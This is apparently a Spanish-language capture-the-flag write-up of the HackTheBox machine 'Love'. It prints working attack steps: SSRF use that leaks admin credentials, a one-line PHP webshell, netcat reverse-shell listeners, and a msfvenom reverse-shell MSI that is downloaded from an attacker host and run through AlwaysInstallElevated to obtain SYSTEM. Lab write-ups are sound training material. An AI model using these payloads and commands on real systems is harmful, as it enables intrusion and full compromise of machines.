# Love

## 1. Introducción

### 1.2 Antecedentes

Durante la fase inicial se identificó un servidor Apache en Windows ejecutando una aplicación llamada **Voting System using PHP**.

Además, se detectó un subdominio `staging.love.htb`, lo que indicaba la posible existencia de un entorno de pruebas.

La clave del compromiso inicial fue una vulnerabilidad SSRF en `/beta.php`.

### 1.3 Objetivos

- Obtener acceso inicial al sistema
- Escalar privilegios a Administrator / SYSTEM

---

## 2. Enumeración

### 2.1 Nmap

Se comienza con un escaneo Nmap:

```bash
nmap -sCV -p- love.htb
```

Puertos relevantes:

- 80 → Apache + PHP (Voting System)
- 443 → staging.love.htb
- 445 → SMB
- 3306 → MariaDB

La página principal mostraba un sistema de votación con login para votantes.

Se descubrió un endpoint interesante:

```
/beta.php
```

Este permitía introducir una URL → Vulnerabilidad SSRF confirmada.

### 2.2 SSRF descubierto

El parámetro permitía consultas a:

```
http://127.0.0.1
```

Esto permitió enumerar servicios internos no visibles externamente.

Durante la enumeración interna se encontró un endpoint que revelaba:

```
Vote Admin Creds
admin : @LoveIsInTheAir!!!!
```

---

## 3. Explotación

### 3.1 Acceso al Panel Admin

Las credenciales obtenidas se probaron en:

```
http://love.htb/admin
```

Login exitoso como administrador.

### 3.2 Subida de Webshell

Desde el panel se permitió subir un archivo PHP.

Se subió una webshell simple:

```php
<?php system($_GET['cmd']); ?>
```

El archivo quedó accesible en:

```
http://love.htb/images/shell.php
```

Confirmación de RCE:

```bash
whoami
```

Resultado:

```
love\phoebe
```

### 3.3 Reverse Shell

Se ejecutó una reverse shell en PowerShell:

Listener en Kali:

```
rlwrap nc -lvnp 9001
```

Desde la webshell:

```
powershell -c "..."
```

Shell obtenida como:

```
love\phoebe
```

---

# 4. Post-Explotación

## 4.1 Enumeración de Privilegios

Se verificaron privilegios:

```
whoami /priv
```

Sin privilegios especiales.

Se revisó:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Se confirmó:

```
AlwaysInstallElevated = 1
```

---

### 4.2 Bypass de AppLocker

Se observó que AppLocker restringía ejecución de MSI excepto en directorios específicos permitidos para:

- Phoebe
- Administrator

Se utilizó el exploit correspondiente para bypass.

### 4.3 Generación de Payload MSI

Se creó un MSI malicioso con:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f msi > reverse.msi
```

Servidor Python:

```bash
python3 -m http.server 8000
```

Listener:

```bash
rlwrap nc -lvnp 4444
```

---

### 4.4 Ejecución como SYSTEM

En la máquina víctima:

```powershell
wget 10.10.14.18:8000/reverse.msi -o reverse.msi
msiexec /quiet /i reverse.msi
```

Se recibió shell como:

```
nt authority\system
```
